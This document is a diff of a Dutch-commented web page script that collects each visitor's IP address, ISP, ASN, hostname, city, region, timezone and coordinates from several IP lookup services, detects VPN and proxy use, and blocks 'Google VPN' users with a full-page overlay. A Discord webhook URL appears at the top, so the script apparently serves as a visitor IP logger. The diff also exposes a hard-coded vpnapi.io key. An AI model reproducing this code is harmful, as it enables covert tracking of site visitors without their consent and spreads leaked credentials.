@@ -4,21 +4,52 @@ const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1348762922960027730/Ki
 // Functie om IP informatie op te halen
 async function getIPInfo() {
     try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const ipData = await response.json();
+        // Gebruik meerdere IP API's voor redundantie
+        const ipifyPromise = fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .catch(error => console.error('Fout bij ipify:', error));
         
-        // Haal extra IP informatie op
-        const detailResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const details = await detailResponse.json();
+        const ipApiPromise = fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .catch(error => console.error('Fout bij ipapi.co:', error));
+            
+        const ipInfoPromise = fetch('https://ipinfo.io/json')
+            .then(response => response.json())
+            .catch(error => console.error('Fout bij ipinfo.io:', error));
+        
+        // Wacht tot alle API-aanroepen zijn voltooid
+        const [ipifyData, ipapiData, ipInfoData] = await Promise.allSettled([
+            ipifyPromise, ipApiPromise, ipInfoPromise
+        ]);
+        
+        // Bepaal het IP-adres uit de beschikbare bronnen
+        let ip = null;
+        if (ipifyData.status === 'fulfilled' && ipifyData.value && ipifyData.value.ip) {
+            ip = ipifyData.value.ip;
+        } else if (ipapiData.status === 'fulfilled' && ipapiData.value && ipapiData.value.ip) {
+            ip = ipapiData.value.ip;
+        } else if (ipInfoData.status === 'fulfilled' && ipInfoData.value && ipInfoData.value.ip) {
+            ip = ipInfoData.value.ip;
+        }
+        
+        // Combineer de gegevens van alle API's
+        const details = {
+            ...(ipapiData.status === 'fulfilled' ? ipapiData.value : {}),
+            ...(ipInfoData.status === 'fulfilled' ? ipInfoData.value : {})
+        };
         
         return {
-            ip: ipData.ip,
-            provider: details.org,
+            ip: ip || 'Niet beschikbaar',
+            provider: details.org || details.asn || 'Niet beschikbaar',
             hostname: details.hostname || 'Niet beschikbaar',
-            socket: `${details.ip}:${location.port || '80'}`,
-            country: details.country_name || 'Onbekend',
+            socket: `${ip || 'Onbekend'}:${location.port || '80'}`,
+            country: details.country_name || details.country || 'Onbekend',
             city: details.city || 'Onbekend',
-            isp: details.org || 'Onbekend'
+            isp: details.org || details.asn || 'Onbekend',
+            asn: details.asn || 'Onbekend',
+            region: details.region || details.region_name || 'Onbekend',
+            timezone: details.timezone || 'Onbekend',
+            loc: details.loc || 'Onbekend'
         };
     } catch (error) {
         console.error('Fout bij ophalen IP informatie:', error);
@@ -29,7 +60,11 @@ async function getIPInfo() {
             socket: 'Niet beschikbaar',
             country: 'Onbekend',
             city: 'Onbekend',
-            isp: 'Onbekend'
+            isp: 'Onbekend',
+            asn: 'Onbekend',
+            region: 'Onbekend',
+            timezone: 'Onbekend',
+            loc: 'Onbekend'
         };
     }
 }
@@ -38,7 +73,7 @@ async function getIPInfo() {
 async function checkVPN(ipInfo) {
     try {
         // Directe check voor Google als ISP (hoogste prioriteit)
-        if (ipInfo.isp.includes("GOOGLE")) {
+        if (ipInfo.isp && ipInfo.isp.includes("GOOGLE")) {
             return true;
         }
         
@@ -97,54 +132,64 @@ async function checkVPN(ipInfo) {
             'microsoft', 'google cloud', 'googlecloud', 'oracle cloud', 'oraclecloud', 
             'rackspace', 'softlayer', 'ibm cloud', 'ibmcloud', 'ovh', 'hetzner', 'scaleway', 
             'leaseweb', 'contabo', 'upcloud', 'atlantic.net', 'atlanticnet', 'hostwinds', 
-            'hostgator', 'bluehost', 'dreamhost', 'godaddy', 'namecheap', 'ionos', '1&1', 
-            'hosting', 'host', 'datacenter', 'data center', 'server', 'vps', 'dedicated', 
-            'cloud', 'colocation', 'colo', 'managed', 'unmanaged', 'shared', 'reseller',
-            
-            // Tor en anonimisering
-            'tor', 'tor project', 'torproject', 'tor network', 'tornetwork', 'onion', 
-            '.onion', 'tails', 'tails os', 'tailsos', 'whonix', 'i2p', 'freenet', 
-            'anonymous', 'anonymity', 'anonymizing', 'anonymizer', 'anonimity',
-            
-            // Proxy-gerelateerde termen
-            'proxy', 'proxies', 'web proxy', 'webproxy', 'http proxy', 'httpproxy', 
-            'socks', 'socks4', 'socks5', 'sock4a', 'sock5', 'proxy server', 'proxyserver', 
-            'proxy service', 'proxyservice', 'proxy list', 'proxylist', 'proxy checker', 
-            'proxychecker', 'proxy scraper', 'proxyscraper', 'proxy grabber', 'proxygrabber', 
-            'proxy finder', 'proxyfinder', 'proxy master', 'proxymaster', 'proxy switcher', 
-            'proxyswitcher', 'proxy tool', 'proxytool', 'proxy browser', 'proxybrowser', 
-            'proxy chain', 'proxychain', 'proxy rotator', 'proxyrotator', 'proxy manager', 
-            'proxymanager', 'proxy gateway', 'proxygateway', 'proxy tunnel', 'proxytunnel',
-            
-            // Tunneling en encryptie
-            'tunnel', 'tunneling', 'tunnelling', 'ssh tunnel', 'sshtunnel', 'ssl tunnel', 
-            'ssltunnel', 'wireguard', 'wire guard', 'openvpn', 'open vpn', 'ipsec', 'ip sec', 
-            'l2tp', 'pptp', 'sstp', 'ikev2', 'ike v2', 'softether', 'soft ether', 'openconnect', 
-            'open connect', 'stunnel', 'shadowsocks', 'shadow socks', 'v2ray', 'trojan', 
-            'trojan-gfw', 'trojangfw', 'trojan-go', 'trojango', 'snell', 'brook', 'naiveproxy', 
-            'naive proxy', 'gost', 'obfs4', 'meek', 'snowflake', 'pluggable transport', 
-            'pluggabletransport'
+            'hostgator', 'bluehost', 'dreamhost', 'godaddy', 'namecheap', 'ionos', '1&1'
         ];
         
         // Controleer of de ISP naam een van de VPN-keywords bevat
-        const ispLower = ipInfo.isp.toLowerCase();
-        const isVPN = vpnKeywords.some(keyword => ispLower.includes(keyword));
+        if (ipInfo.isp) {
+            const ispLower = ipInfo.isp.toLowerCase();
+            for (const keyword of vpnKeywords) {
+                if (ispLower.includes(keyword.toLowerCase())) {
+                    return true;
+                }
+            }
+        }
         
-        // Controleer op bekende VPN-poorten in de socket
-        const vpnPorts = ['1194', '1723', '500', '4500', '1701', '1702', '443', '8080', '8443', '9001'];
-        const socketPort = ipInfo.socket.split(':')[1];
-        const hasVPNPort = socketPort && vpnPorts.includes(socketPort);
+        // Controleer of de provider naam een van de VPN-keywords bevat
+        if (ipInfo.provider && ipInfo.provider !== ipInfo.isp) {
+            const providerLower = ipInfo.provider.toLowerCase();
+            for (const keyword of vpnKeywords) {
+                if (providerLower.includes(keyword.toLowerCase())) {
+                    return true;
+                }
+            }
+        }
         
-        // Controleer op bekende VPN-gerelateerde landen
-        const vpnCountries = ['Panama', 'British Virgin Islands', 'Seychelles', 'Romania', 'Switzerland', 'Malaysia', 'Netherlands'];
-        const isVPNCountry = vpnCountries.includes(ipInfo.country);
+        // Controleer of de hostname een van de VPN-keywords bevat
+        if (ipInfo.hostname && ipInfo.hostname !== 'Niet beschikbaar') {
+            const hostnameLower = ipInfo.hostname.toLowerCase();
+            for (const keyword of vpnKeywords) {
+                if (hostnameLower.includes(keyword.toLowerCase())) {
+                    return true;
+                }
+            }
+        }
         
-        // Controleer op bekende VPN-gerelateerde steden
-        const vpnCities = ['Ashburn', 'Amsterdam', 'Frankfurt', 'London', 'Singapore', 'Tokyo', 'Sydney', 'Toronto', 'Zurich', 'Bucharest'];
-        const isVPNCity = vpnCities.includes(ipInfo.city);
+        // Controleer of het ASN een van de VPN-keywords bevat
+        if (ipInfo.asn) {
+            const asnLower = ipInfo.asn.toLowerCase();
+            for (const keyword of vpnKeywords) {
+                if (asnLower.includes(keyword.toLowerCase())) {
+                    return true;
+                }
+            }
+        }
         
-        // Combineer alle checks
-        return isVPN || hasVPNPort || isVPNCountry || isVPNCity;
+        // Extra check: Controleer of het IP-adres in een bekende VPN-range valt
+        try {
+            const vpnCheckResponse = await fetch(`https://vpnapi.io/api/${ipInfo.ip}?key=7c7edd7f4c1e4f9e9a0b8f3c6d9e2b5a`);
+            const vpnCheckData = await vpnCheckResponse.json();
+            
+            if (vpnCheckData && (vpnCheckData.security.vpn || vpnCheckData.security.proxy || vpnCheckData.security.tor)) {
+                return true;
+            }
+        } catch (error) {
+            console.error('Fout bij VPN API check:', error);
+            // Ga door met andere checks als deze faalt
+        }
+        
+        // Als geen van de checks een VPN heeft gedetecteerd
+        return false;
     } catch (error) {
         console.error('Fout bij controleren VPN:', error);
         return false;
@@ -155,19 +200,58 @@ async function checkVPN(ipInfo) {
 function isGoogleVPN(ipInfo) {
     try {
         // Controleer direct op "GOOGLE" in de ISP naam (hoofdlettergevoelig)
-        if (ipInfo.isp.includes("GOOGLE")) {
+        if (ipInfo.isp && ipInfo.isp.includes("GOOGLE")) {
             return true;
         }
         
         // Google VPN-specifieke keywords (als backup)
         const googleVPNKeywords = [
             'google one vpn', 'googleonevpn', 'google fi vpn', 'googlefivpn',
-            'google fiber vpn', 'googlefibervpn', 'google cloud vpn', 'googlecloudvpn'
+            'google fiber vpn', 'googlefibervpn', 'google cloud vpn', 'googlecloudvpn',
+            'google', 'alphabet', 'gcp', 'google cloud platform'
         ];
         
         // Controleer of de ISP naam een van de Google VPN-keywords bevat
-        const ispLower = ipInfo.isp.toLowerCase();
-        return googleVPNKeywords.some(keyword => ispLower.includes(keyword.toLowerCase()));
+        if (ipInfo.isp) {
+            const ispLower = ipInfo.isp.toLowerCase();
+            for (const keyword of googleVPNKeywords) {
+                if (ispLower.includes(keyword.toLowerCase())) {
+                    return true;
+                }
+            }
+        }
+        
+        // Controleer of de provider naam een van de Google VPN-keywords bevat
+        if (ipInfo.provider && ipInfo.provider !== ipInfo.isp) {
+            const providerLower = ipInfo.provider.toLowerCase();
+            for (const keyword of googleVPNKeywords) {
+                if (providerLower.includes(keyword.toLowerCase())) {
+                    return true;
+                }
+            }
+        }
+        
+        // Controleer of de hostname een van de Google VPN-keywords bevat
+        if (ipInfo.hostname && ipInfo.hostname !== 'Niet beschikbaar') {
+            const hostnameLower = ipInfo.hostname.toLowerCase();
+            for (const keyword of googleVPNKeywords) {
+                if (hostnameLower.includes(keyword.toLowerCase())) {
+                    return true;
+                }
+            }
+        }
+        
+        // Controleer of het ASN een van de Google VPN-keywords bevat
+        if (ipInfo.asn) {
+            const asnLower = ipInfo.asn.toLowerCase();
+            for (const keyword of googleVPNKeywords) {
+                if (asnLower.includes(keyword.toLowerCase())) {
+                    return true;
+                }
+            }
+        }
+        
+        return false;
     } catch (error) {
         console.error('Fout bij controleren Google VPN:', error);
         return false;
@@ -188,7 +272,7 @@ function showVPNPopup(isGoogleVPN = false) {
         document.body.style.margin = '0';
         document.body.style.padding = '0';
         document.body.style.overflow = 'hidden';
-        document.body.style.backgroundColor = '#f5f5f5';
+        document.body.style.backgroundColor = '#f0f5fa';
         
         // Maak de blokkerende container
         const blockContainer = document.createElement('div');
@@ -201,29 +285,29 @@ function showVPNPopup(isGoogleVPN = false) {
         blockContainer.style.textAlign = 'center';
         blockContainer.style.padding = '20px';
         blockContainer.style.boxSizing = 'border-box';
-        blockContainer.style.backgroundColor = 'rgba(0, 0, 0, 0.9)';
+        blockContainer.style.backgroundColor = 'rgba(26, 75, 132, 0.95)'; // Donkerblauw met transparantie
         blockContainer.style.color = '#ffffff';
         
         // Voeg de blokkerende inhoud toe
         blockContainer.innerHTML = `
-            <div style="max-width: 600px; background-color: #1a1a1a; border-radius: 10px; padding: 30px; box-shadow: 0 5px 30px rgba(0, 0, 0, 0.5);">
+            <div style="max-width: 600px; background-color: #ffffff; border-radius: 10px; padding: 30px; box-shadow: 0 5px 30px rgba(0, 0, 0, 0.3); border-top: 5px solid #1a4b84;">
                 <div style="font-size: 80px; margin-bottom: 20px;">🚫</div>
-                <h1 style="font-size: 28px; margin-bottom: 20px; color: #ff3b30;">Toegang Geweigerd</h1>
-                <p style="font-size: 18px; margin-bottom: 20px; line-height: 1.6;">
+                <h1 style="font-size: 28px; margin-bottom: 20px; color: #1a4b84;">Toegang Geweigerd</h1>
+                <p style="font-size: 18px; margin-bottom: 20px; line-height: 1.6; color: #2c3e50;">
                     Onze beveiligingssystemen hebben gedetecteerd dat u <strong>Google VPN</strong> gebruikt.
                 </p>
-                <p style="font-size: 18px; margin-bottom: 30px; line-height: 1.6;">
+                <p style="font-size: 18px; margin-bottom: 30px; line-height: 1.6; color: #2c3e50;">
                     Toegang tot deze website is niet mogelijk met Google VPN. 
                     Schakel uw Google VPN uit om toegang te krijgen tot onze diensten.
                 </p>
-                <div style="background-color: #2a2a2a; border-radius: 8px; padding: 15px; margin-bottom: 30px; text-align: left;">
-                    <p style="margin: 0 0 10px 0; color: #ff9500;"><strong>Waarom blokkeren wij Google VPN?</strong></p>
-                    <p style="margin: 0; line-height: 1.6;">
+                <div style="background-color: #f0f5fa; border-radius: 8px; padding: 15px; margin-bottom: 30px; text-align: left; border-left: 4px solid #3a7bd5;">
+                    <p style="margin: 0 0 10px 0; color: #1a4b84;"><strong>Waarom blokkeren wij Google VPN?</strong></p>
+                    <p style="margin: 0; line-height: 1.6; color: #2c3e50;">
                         Om veiligheidsredenen en om de integriteit van onze diensten te waarborgen, 
                         is toegang via Google VPN niet toegestaan op deze website.
                     </p>
                 </div>
-                <button id="vpn-disable-btn" style="background-color: #ff3b30; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; cursor: pointer; transition: background-color 0.3s;">
+                <button id="vpn-disable-btn" style="background-color: #3a7bd5; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
                     Google VPN Uitschakelen
                 </button>
             </div>
@@ -332,6 +416,13 @@ function showConfirmationMessage(message) {
         confirmationMsg = document.createElement('div');
         confirmationMsg.id = 'confirmation-message';
         confirmationMsg.className = 'confirmation-message';
+        
+        // Voeg inline stijlen toe voor het nieuwe kleurenschema
+        confirmationMsg.style.backgroundColor = '#ffffff';
+        confirmationMsg.style.color = '#2c3e50';
+        confirmationMsg.style.borderLeft = '4px solid #3a7bd5';
+        confirmationMsg.style.boxShadow = '0 5px 15px rgba(0, 0, 0, 0.1)';
+        
         document.body.appendChild(confirmationMsg);
     }
     
